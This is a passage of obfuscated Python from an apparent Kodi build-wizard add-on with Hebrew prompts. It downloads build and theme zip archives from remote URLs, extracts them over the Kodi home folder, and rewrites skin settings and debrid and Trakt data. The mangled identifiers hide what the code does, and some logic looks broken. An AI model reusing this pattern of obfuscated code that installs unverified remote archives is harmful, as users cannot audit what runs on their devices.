			OOOOOOO0O0OOO0O0O .close ()#line:3885
		except :#line:3886
				pass #line:3887
		wiz .kodi17Fix ()#line:3888
		O0OO0OO000O0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3889
		try :#line:3890
			OOOOOOO0O0OOO0O0O =open (O0OO0OO000O0000O0 ,'r')#line:3891
			O0O0OOOOOOO0OOO0O =OOOOOOO0O0OOO0O0O .read ()#line:3892
			OOOOOOO0O0OOO0O0O .close ()#line:3893
			OOOOOO000O00O0OOO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3894
			O0OOOO000OO00OO00 =re .compile (OOOOOO000O00O0OOO ).findall (O0O0OOOOOOO0OOO0O )[0 ]#line:3895
			OOOOOOO0O0OOO0O0O =open (O0OO0OO000O0000O0 ,'w')#line:3896
			OOOOOOO0O0OOO0O0O .write (O0O0OOOOOOO0OOO0O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0OOOO000OO00OO00 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3897
			OOOOOOO0O0OOO0O0O .close ()#line:3898
		except :#line:3899
				pass #line:3900
		swapSkins ('skin.Premium.mod')#line:3901
def buildWizard (OOOO0O00O00O0000O ,O0O00O0000000O000 ,theme =None ,over =False ):#line:3904
	if over ==False :#line:3905
		O000OOO00OOOO0000 =wiz .checkBuild (OOOO0O00O00O0000O ,'url')#line:3906
		if O000OOO00OOOO0000 ==False :#line:3908
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3913
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3914
			return #line:3915
		O0O0OO00O0O0OO00O =wiz .workingURL (O000OOO00OOOO0000 )#line:3916
		if O0O0OO00O0O0OO00O ==False :#line:3917
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0O0OO00O0O0OO00O ))#line:3918
			return #line:3919
	if O0O00O0000000O000 =='gui':#line:3920
		if OOOO0O00O00O0000O ==BUILDNAME :#line:3921
			if over ==True :O0O00OO00OOO0O00O =1 #line:3922
			else :O0O00OO00OOO0O00O =1 #line:3923
		else :#line:3924
			O0O00OO00OOO0O00O =1 #line:3925
		if O0O00OO00OOO0O00O :#line:3926
			remove_addons ()#line:3927
			remove_addons2 ()#line:3928
			debridit .debridIt ('update','all')#line:3929
			traktit .traktIt ('update','all')#line:3930
			O0OO00OOOOO00O00O =wiz .checkBuild (OOOO0O00O00O0000O ,'gui')#line:3931
			OOOO00O00OO0O0000 =OOOO0O00O00O0000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3932
			if not wiz .workingURL (O0OO00OOOOO00O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3933
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3934
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O00O00O0000O ),'','אנא המתן')#line:3935
			O00O0OOOO000OO00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO00O00OO0O0000 )#line:3936
			try :os .remove (O00O0OOOO000OO00O )#line:3937
			except :pass #line:3938
			logging .warning (O0OO00OOOOO00O00O )#line:3939
			if 'google'in O0OO00OOOOO00O00O :#line:3940
			   O00O000OOO00000OO =googledrive_download (O0OO00OOOOO00O00O ,O00O0OOOO000OO00O ,DP ,wiz .checkBuild (OOOO0O00O00O0000O ,'filesize'))#line:3941
			else :#line:3944
			  downloader .download (O0OO00OOOOO00O00O ,O00O0OOOO000OO00O ,DP )#line:3945
			xbmc .sleep (100 )#line:3946
			OOO00O0O00OOO0OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O00O00O0000O )#line:3947
			DP .update (0 ,OOO00O0O00OOO0OO0 ,'','אנא המתן')#line:3948
			extract .all (O00O0OOOO000OO00O ,HOME ,DP ,title =OOO00O0O00OOO0OO0 )#line:3949
			DP .close ()#line:3950
			wiz .defaultSkin ()#line:3951
			wiz .lookandFeelData ('save')#line:3952
			wiz .kodi17Fix ()#line:3953
			if KODIV >=18 :#line:3954
				skindialogsettind18 ()#line:3955
			debridit .debridIt ('restore','all')#line:3956
			traktit .traktIt ('restore','all')#line:3957
			if INSTALLMETHOD ==1 :O0OOO00O0OO000O0O =1 #line:3959
			elif INSTALLMETHOD ==2 :O0OOO00O0OO000O0O =0 #line:3960
			else :DP .close ()#line:3961
			O000O000OO00OOO0O =(NOTIFICATION2 )#line:3962
			O0O000O0OOO0OOOOO =urllib2 .urlopen (O000O000OO00OOO0O )#line:3963
			O00O0O00O000OO0O0 =O0O000O0OOO0OOOOO .readlines ()#line:3964
			OOOOOOOOOOO0O00O0 =0 #line:3965
			for O00000000OO000OOO in O00O0O00O000OO0O0 :#line:3968
				if O00000000OO000OOO .split (' ==')[0 ]=="noreset"or O00000000OO000OOO .split ()[0 ]=="noreset":#line:3969
					xbmc .executebuiltin ("ReloadSkin()")#line:3971
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3972
					update_Votes ()#line:3973
					indicatorfastupdate ()#line:3974
				if O00000000OO000OOO .split (' ==')[0 ]=="reset"or O00000000OO000OOO .split ()[0 ]=="reset":#line:3975
					update_Votes ()#line:3977
					indicatorfastupdate ()#line:3978
					resetkodi ()#line:3979
		else :#line:3988
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3989
	if O0O00O0000000O000 =='gui2':#line:3990
		if OOOO0O00O00O0000O ==BUILDNAME :#line:3991
			if over ==True :O0O00OO00OOO0O00O =1 #line:3992
			else :O0O00OO00OOO0O00O =1 #line:3993
		else :#line:3994
			O0O00OO00OOO0O00O =1 #line:3995
		if O0O00OO00OOO0O00O :#line:3996
			remove_addons ()#line:3997
			remove_addons2 ()#line:3998
			O0OO00OOOOO00O00O =wiz .checkBuild (OOOO0O00O00O0000O ,'gui')#line:3999
			OOOO00O00OO0O0000 =OOOO0O00O00O0000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4000
			if not wiz .workingURL (O0OO00OOOOO00O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4001
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4002
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O00O00O0000O ),'','אנא המתן')#line:4003
			O00O0OOOO000OO00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO00O00OO0O0000 )#line:4004
			try :os .remove (O00O0OOOO000OO00O )#line:4005
			except :pass #line:4006
			logging .warning (O0OO00OOOOO00O00O )#line:4007
			if 'google'in O0OO00OOOOO00O00O :#line:4008
			   O00O000OOO00000OO =googledrive_download (O0OO00OOOOO00O00O ,O00O0OOOO000OO00O ,DP ,wiz .checkBuild (OOOO0O00O00O0000O ,'filesize'))#line:4009
			else :#line:4012
			  downloader .download (O0OO00OOOOO00O00O ,O00O0OOOO000OO00O ,DP )#line:4013
			xbmc .sleep (100 )#line:4014
			OOO00O0O00OOO0OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O00O00O0000O )#line:4015
			DP .update (0 ,OOO00O0O00OOO0OO0 ,'','אנא המתן')#line:4016
			extract .all (O00O0OOOO000OO00O ,HOME ,DP ,title =OOO00O0O00OOO0OO0 )#line:4017
			DP .close ()#line:4018
			wiz .defaultSkin ()#line:4019
			wiz .lookandFeelData ('save')#line:4020
			if INSTALLMETHOD ==1 :O0OOO00O0OO000O0O =1 #line:4023
			elif INSTALLMETHOD ==2 :O0OOO00O0OO000O0O =0 #line:4024
			else :DP .close ()#line:4025
		else :#line:4027
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4028
	elif O0O00O0000000O000 =='fresh':#line:4029
		freshStart (OOOO0O00O00O0000O )#line:4030
	elif O0O00O0000000O000 =='normal':#line:4031
		if url =='normal':#line:4032
			if KEEPTRAKT =='true':#line:4033
				traktit .autoUpdate ('all')#line:4034
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4035
			if KEEPREAL =='true':#line:4036
				debridit .autoUpdate ('all')#line:4037
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4038
			if KEEPLOGIN =='true':#line:4039
				loginit .autoUpdate ('all')#line:4040
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4041
		O0OO000O00O00000O =int (KODIV );O0O00OOO0O0OOO00O =int (float (wiz .checkBuild (OOOO0O00O00O0000O ,'kodi')))#line:4042
		if not O0OO000O00O00000O ==O0O00OOO0O0OOO00O :#line:4043
			if O0OO000O00O00000O ==16 and O0O00OOO0O0OOO00O <=15 :O0O0O0OO0OO0OO0O0 =False #line:4044
			else :O0O0O0OO0OO0OO0O0 =True #line:4045
		else :O0O0O0OO0OO0OO0O0 =False #line:4046
		if O0O0O0OO0OO0OO0O0 ==True :#line:4047
			OO000OO0O0OOO0000 =1 #line:4048
		else :#line:4049
			if not over ==False :OO000OO0O0OOO0000 =1 #line:4050
			else :OO000OO0O0OOO0000 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4051
		if OO000OO0O0OOO0000 :#line:4052
			wiz .clearS ('build')#line:4053
			O0OO00OOOOO00O00O =wiz .checkBuild (OOOO0O00O00O0000O ,'url')#line:4054
			OOOO00O00OO0O0000 =OOOO0O00O00O0000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4055
			if not wiz .workingURL (O0OO00OOOOO00O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4056
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4057
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OOOO0O00O00O0000O ,wiz .checkBuild (OOOO0O00O00O0000O ,'version')),'','אנא המתן')#line:4058
			O00O0OOOO000OO00O =os .path .join (PACKAGES ,'%s.zip'%OOOO00O00OO0O0000 )#line:4059
			try :os .remove (O00O0OOOO000OO00O )#line:4060
			except :pass #line:4061
			logging .warning (O0OO00OOOOO00O00O )#line:4062
			if 'google'in O0OO00OOOOO00O00O :#line:4063
			   O00O000OOO00000OO =googledrive_download (O0OO00OOOOO00O00O ,O00O0OOOO000OO00O ,DP ,wiz .checkBuild (OOOO0O00O00O0000O ,'filesize'))#line:4064
			else :#line:4067
			  downloader .download (O0OO00OOOOO00O00O ,O00O0OOOO000OO00O ,DP )#line:4068
			xbmc .sleep (1000 )#line:4069
			OOO00O0O00OOO0OO0 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O00O00O0000O ,wiz .checkBuild (OOOO0O00O00O0000O ,'version'))#line:4070
			DP .update (0 ,OOO00O0O00OOO0OO0 ,'','אנא המתן...')#line:4071
			OOOO000OOOOOO0O00 ,O0O0O0000OO00O0OO ,OOO0000O00O000O00 =extract .all (O00O0OOOO000OO00O ,HOME ,DP ,title =OOO00O0O00OOO0OO0 )#line:4072
			if int (float (OOOO000OOOOOO0O00 ))>0 :#line:4073
				try :#line:4074
					wiz .fixmetas ()#line:4075
				except :pass #line:4076
				wiz .lookandFeelData ('save')#line:4077
				wiz .defaultSkin ()#line:4078
				wiz .setS ('buildname',OOOO0O00O00O0000O )#line:4080
				wiz .setS ('buildversion',wiz .checkBuild (OOOO0O00O00O0000O ,'version'))#line:4081
				wiz .setS ('buildtheme','')#line:4082
				wiz .setS ('latestversion',wiz .checkBuild (OOOO0O00O00O0000O ,'version'))#line:4083
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4084
				wiz .setS ('installed','true')#line:4085
				wiz .setS ('extract',str (OOOO000OOOOOO0O00 ))#line:4086
				wiz .setS ('errors',str (O0O0O0000OO00O0OO ))#line:4087
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOO000OOOOOO0O00 ,O0O0O0000OO00O0OO ))#line:4088
				fastupdatefirstbuild (NOTEID )#line:4089
				wiz .kodi17Fix ()#line:4090
				skin_homeselect ()#line:4091
				skin_lower ()#line:4092
				rdbuildinstall ()#line:4093
				try :gaiaserenaddon ()#line:4094
				except :pass #line:4095
				adults18 ()#line:4096
				skinfix18 ()#line:4097
				try :os .remove (O00O0OOOO000OO00O )#line:4099
				except :pass #line:4100
				OOO0OOO0000OO0O00 =(ADDON .getSetting ("auto_rd"))#line:4101
				if OOO0OOO0000OO0O00 =='true':#line:4102
					try :#line:4103
						setautorealdebrid ()#line:4104
					except :pass #line:4105
				try :#line:4106
					autotrakt ()#line:4107
				except :pass #line:4108
				O00OOOO0O0OO0O00O =(ADDON .getSetting ("imdb_on"))#line:4109
				if O00OOOO0O0OO0O00O =='true':#line:4110
					imdb_synck ()#line:4111
				iptvset ()#line:4112
				DP .close ()#line:4120
				O00OOO00000000OOO =wiz .themeCount (OOOO0O00O00O0000O )#line:4121
				builde_Votes ()#line:4122
				indicator ()#line:4123
				if not O00OOO00000000OOO ==False :#line:4124
					buildWizard (OOOO0O00O00O0000O ,'theme')#line:4125
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4126
				if INSTALLMETHOD ==1 :O0OOO00O0OO000O0O =1 #line:4127
				elif INSTALLMETHOD ==2 :O0OOO00O0OO000O0O =0 #line:4128
				else :resetkodi ()#line:4129
				if O0OOO00O0OO000O0O ==1 :wiz .reloadFix ()#line:4131
				else :wiz .killxbmc (True )#line:4132
			else :#line:4133
				if isinstance (O0O0O0000OO00O0OO ,unicode ):#line:4134
					OOO0000O00O000O00 =OOO0000O00O000O00 .encode ('utf-8')#line:4135
				OO0O000O00O0OOOO0 =open (O00O0OOOO000OO00O ,'r')#line:4136
				OOO0OO0O0000O00O0 =OO0O000O00O0OOOO0 .read ()#line:4137
				O0OOO0OO0OOOOO00O =''#line:4138
				for OO0O0000O00O00OO0 in O00O000OOO00000OO :#line:4139
				  O0OOO0OO0OOOOO00O ='key: '+O0OOO0OO0OOOOO00O +'\n'+OO0O0000O00O00OO0 #line:4140
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OOO0000O00O000O00 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0OOO0OO0OOOOO00O )#line:4141
		else :#line:4142
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4143
	elif O0O00O0000000O000 =='theme':#line:4144
		if theme ==None :#line:4145
			O00OOO00000000OOO =wiz .checkBuild (OOOO0O00O00O0000O ,'theme')#line:4146
			O00O00O0OO0OOOOOO =[]#line:4147
			if not O00OOO00000000OOO =='http://'and wiz .workingURL (O00OOO00000000OOO )==True :#line:4148
				O00O00O0OO0OOOOOO =wiz .themeCount (OOOO0O00O00O0000O ,False )#line:4149
				if len (O00O00O0OO0OOOOOO )>0 :#line:4150
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOOO0O00O00O0000O ,COLOR1 ,len (O00O00O0OO0OOOOOO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4151
						wiz .log ("Theme List: %s "%str (O00O00O0OO0OOOOOO ))#line:4152
						O0OO000O000O00OO0 =DIALOG .select (ADDONTITLE ,O00O00O0OO0OOOOOO )#line:4153
						wiz .log ("Theme install selected: %s"%O0OO000O000O00OO0 )#line:4154
						if not O0OO000O000O00OO0 ==-1 :theme =O00O00O0OO0OOOOOO [O0OO000O000O00OO0 ];O00OO00OO0OOO00O0 =True #line:4155
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4156
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4157
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4158
		else :O00OO00OO0OOO00O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOOO0O00O00O0000O ,wiz .checkBuild (OOOO0O00O00O0000O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4159
		if O00OO00OO0OOO00O0 :#line:4160
			O00000OO00000O0O0 =wiz .checkTheme (OOOO0O00O00O0000O ,theme ,'url')#line:4161
			OOOO00O00OO0O0000 =OOOO0O00O00O0000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4162
			if not wiz .workingURL (O00000OO00000O0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4163
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4164
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4165
			O00O0OOOO000OO00O =os .path .join (PACKAGES ,'%s.zip'%OOOO00O00OO0O0000 )#line:4166
			try :os .remove (O00O0OOOO000OO00O )#line:4167
			except :pass #line:4168
			downloader .download (O00000OO00000O0O0 ,O00O0OOOO000OO00O ,DP )#line:4169
			xbmc .sleep (1000 )#line:4170
			DP .update (0 ,"","Installing %s "%OOOO0O00O00O0000O )#line:4171
			OOO0O0O0O0O00O000 =False #line:4172
			if url not in ["fresh","normal"]:#line:4173
				OOO0O0O0O0O00O000 =testTheme (O00O0OOOO000OO00O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4174
				O00OO000OO0O00000 =testGui (O00O0OOOO000OO00O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4175
				if OOO0O0O0O0O00O000 ==True :#line:4176
					wiz .lookandFeelData ('save')#line:4177
					OO000O0OO00OO0O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4178
					OOOO0O0000O0O00OO =xbmc .getSkinDir ()#line:4179
					skinSwitch .swapSkins (OO000O0OO00OO0O00 )#line:4181
					O00O0O00O000OO0O0 =0 #line:4182
					xbmc .sleep (1000 )#line:4183
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0O00O000OO0O0 <150 :#line:4184
						O00O0O00O000OO0O0 +=1 #line:4185
						xbmc .sleep (1000 )#line:4186
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4187
						wiz .ebi ('SendClick(11)')#line:4188
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4189
					xbmc .sleep (1000 )#line:4190
			OOO00O0O00OOO0OO0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4191
			DP .update (0 ,OOO00O0O00OOO0OO0 ,'','אנא המתן')#line:4192
			OOOO000OOOOOO0O00 ,O0O0O0000OO00O0OO ,OOO0000O00O000O00 =extract .all (O00O0OOOO000OO00O ,HOME ,DP ,title =OOO00O0O00OOO0OO0 )#line:4193
			wiz .setS ('buildtheme',theme )#line:4194
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOOO000OOOOOO0O00 ,O0O0O0000OO00O0OO ))#line:4195
			DP .close ()#line:4196
			if url not in ["fresh","normal"]:#line:4197
				wiz .forceUpdate ()#line:4198
				if KODIV >=17 :wiz .kodi17Fix ()#line:4199
				if O00OO000OO0O00000 ==True :#line:4200
					wiz .lookandFeelData ('save')#line:4201
					wiz .defaultSkin ()#line:4202
					OOOO0O0000O0O00OO =wiz .getS ('defaultskin')#line:4203
					skinSwitch .swapSkins (OOOO0O0000O0O00OO )#line:4204
					O00O0O00O000OO0O0 =0 #line:4205
					xbmc .sleep (1000 )#line:4206
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0O00O000OO0O0 <150 :#line:4207
						O00O0O00O000OO0O0 +=1 #line:4208
						xbmc .sleep (1000 )#line:4209
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4211
						wiz .ebi ('SendClick(11)')#line:4212
					wiz .lookandFeelData ('restore')#line:4213
				elif OOO0O0O0O0O00O000 ==True :#line:4214
					skinSwitch .swapSkins (OOOO0O0000O0O00OO )#line:4215
					O00O0O00O000OO0O0 =0 #line:4216
					xbmc .sleep (1000 )#line:4217
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0O00O000OO0O0 <150 :#line:4218
						O00O0O00O000OO0O0 +=1 #line:4219
						xbmc .sleep (1000 )#line:4220
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4222
						wiz .ebi ('SendClick(11)')#line:4223
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4224
					wiz .lookandFeelData ('restore')#line:4225
				else :#line:4226
					wiz .ebi ("ReloadSkin()")#line:4227
					xbmc .sleep (1000 )#line:4228
					wiz .ebi ("Container.Refresh")#line:4229
		else :#line:4230
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4231
def skin_homeselect ():#line:4235
	try :#line:4237
		O00000OOO0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4238
		O0OOO00OO000OO000 =open (O00000OOO0000O0OO ,'r')#line:4240
		O0O000OO0000000OO =O0OOO00OO000OO000 .read ()#line:4241
		O0OOO00OO000OO000 .close ()#line:4242
		OOO0O0O0OO000O0O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4243
		O0O0000OOO0OOO0OO =re .compile (OOO0O0O0OO000O0O0 ).findall (O0O000OO0000000OO )[0 ]#line:4244
		O0OOO00OO000OO000 =open (O00000OOO0000O0OO ,'w')#line:4245
		O0OOO00OO000OO000 .write (O0O000OO0000000OO .replace ('<setting id="HomeS" type="string%s/setting>'%O0O0000OOO0OOO0OO ,'<setting id="HomeS" type="string"></setting>'))#line:4246
		O0OOO00OO000OO000 .close ()#line:4247
	except :#line:4248
		pass #line:4249
def skin_lower ():#line:4252
	O00O0000OO0O0OOOO =(ADDON .getSetting ("lower"))#line:4253
	if O00O0000OO0O0OOOO =='true':#line:4254
		try :#line:4257
			O0OOO0O00O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4258
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'r')#line:4260
			O0O00OOO0OO0OO0O0 =O00O0OOO000O0O0O0 .read ()#line:4261
			O00O0OOO000O0O0O0 .close ()#line:4262
			O00OOO0O0O0OO0O0O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4263
			O00OO0O0000OOO00O =re .compile (O00OOO0O0O0OO0O0O ).findall (O0O00OOO0OO0OO0O0 )[0 ]#line:4264
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'w')#line:4265
			O00O0OOO000O0O0O0 .write (O0O00OOO0OO0OO0O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%O00OO0O0000OOO00O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4266
			O00O0OOO000O0O0O0 .close ()#line:4267
			O0OOO0O00O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4269
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'r')#line:4271
			O0O00OOO0OO0OO0O0 =O00O0OOO000O0O0O0 .read ()#line:4272
			O00O0OOO000O0O0O0 .close ()#line:4273
			O00OOO0O0O0OO0O0O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4274
			O00OO0O0000OOO00O =re .compile (O00OOO0O0O0OO0O0O ).findall (O0O00OOO0OO0OO0O0 )[0 ]#line:4275
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'w')#line:4276
			O00O0OOO000O0O0O0 .write (O0O00OOO0OO0OO0O0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O00OO0O0000OOO00O ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4277
			O00O0OOO000O0O0O0 .close ()#line:4278
			O0OOO0O00O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4280
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'r')#line:4282
			O0O00OOO0OO0OO0O0 =O00O0OOO000O0O0O0 .read ()#line:4283
			O00O0OOO000O0O0O0 .close ()#line:4284
			O00OOO0O0O0OO0O0O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4285
			O00OO0O0000OOO00O =re .compile (O00OOO0O0O0OO0O0O ).findall (O0O00OOO0OO0OO0O0 )[0 ]#line:4286
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'w')#line:4287
			O00O0OOO000O0O0O0 .write (O0O00OOO0OO0OO0O0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O00OO0O0000OOO00O ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4288
			O00O0OOO000O0O0O0 .close ()#line:4289
			O0OOO0O00O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4293
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'r')#line:4295
			O0O00OOO0OO0OO0O0 =O00O0OOO000O0O0O0 .read ()#line:4296
			O00O0OOO000O0O0O0 .close ()#line:4297
			O00OOO0O0O0OO0O0O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4298
			O00OO0O0000OOO00O =re .compile (O00OOO0O0O0OO0O0O ).findall (O0O00OOO0OO0OO0O0 )[0 ]#line:4299
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'w')#line:4300
			O00O0OOO000O0O0O0 .write (O0O00OOO0OO0OO0O0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O00OO0O0000OOO00O ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4301
			O00O0OOO000O0O0O0 .close ()#line:4302
			O0OOO0O00O0OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4306
			O00O0OOO000O0O0O0 =open (O0OOO0O00O0OOOOOO ,'r')#line:4308
			O0O00OOO0OO0OO0O0 =O00O0OOO000O0O0O0 .read ()#line:4309
